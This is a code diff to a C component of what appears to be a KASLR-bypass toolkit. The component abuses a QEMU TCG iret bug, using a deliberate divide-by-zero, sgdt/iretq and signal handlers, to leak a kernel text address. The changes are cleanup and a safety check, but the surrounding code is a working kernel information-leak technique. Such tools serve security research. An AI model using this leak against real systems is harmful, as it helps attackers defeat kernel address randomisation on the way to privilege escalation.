@@ -73,7 +73,7 @@ static sigjmp_buf env;
 // SIGFPE handler: triggered by the intentional div-by-zero in kaslr().
 // Advances RIP past the 3-byte `div rax` instruction so execution
 // continues with the sgdt/iretq sequence.
-void sigfpe_handler(int sig, siginfo_t *si, void *context) {
+static void sigfpe_handler(int sig, siginfo_t *si, void *context) {
   (void)sig;
   (void)si;
   ucontext_t *uc = (ucontext_t *)context;
@@ -85,7 +85,7 @@ void sigfpe_handler(int sig, siginfo_t *si, void *context) {
 // address (0x133a000). Due to the QEMU bug, the iret frame was read from
 // the kernel exception stack, so RIP here contains a kernel .text address
 // (the exception handler return address) leaked from the kernel stack.
-void sigsegv_handler(int sig, siginfo_t *si, void *context) {
+static void sigsegv_handler(int sig, siginfo_t *si, void *context) {
   (void)sig;
   (void)si;
   ucontext_t *uc = (ucontext_t *)context;
@@ -95,7 +95,7 @@ void sigsegv_handler(int sig, siginfo_t *si, void *context) {
   siglongjmp(env, 1);
 }
 
-void kaslr() {
+static void kaslr(void) {
   __asm__ volatile(
       ".intel_syntax noprefix\n"
 
@@ -136,7 +136,7 @@ void kaslr() {
       ".att_syntax noprefix\n");
 }
 
-uint64_t get_kernel_stack_addr_using_qemu_tcg_iret() {
+static uint64_t get_kernel_stack_addr_using_qemu_tcg_iret(void) {
   printf("[.] trying QEMU TCG iret leak ...\n");
 
   // Install SIGFPE handler to recover from the intentional div-by-zero
@@ -148,8 +148,17 @@ uint64_t get_kernel_stack_addr_using_qemu_tcg_iret() {
   // Set up an alternate signal stack so the SIGSEGV handler can run even
   // when RSP has been corrupted to a kernel address (which happens on
   // non-vulnerable systems where iretq faults before restoring a valid RSP).
+  // The alt stack is load-bearing for this technique — without it, a
+  // non-vulnerable system's faulting iretq drops the handler onto the
+  // corrupted main stack and the component segfaults instead of cleanly
+  // reporting "no leak". Bail rather than continue with the safeguard
+  // silently disabled.
   stack_t ss;
   ss.ss_sp = malloc(SIGSTKSZ);
+  if (!ss.ss_sp) {
+    fprintf(stderr, "[-] alt-stack alloc failed; aborting\n");
+    return KASLD_EXIT_UNAVAILABLE;
+  }
   ss.ss_size = SIGSTKSZ;
   ss.ss_flags = 0;
   sigaltstack(&ss, NULL);
@@ -172,7 +181,7 @@ uint64_t get_kernel_stack_addr_using_qemu_tcg_iret() {
     kaslr();
   }
 
-  if (kbase >= KERNEL_BASE_MIN && kbase <= KERNEL_BASE_MAX) {
+  if (kbase >= KERNEL_TEXT_MIN && kbase <= KERNEL_TEXT_MAX) {
     printf("leaked kernel stack address: %lx\n", kbase);
     return kbase;
   }
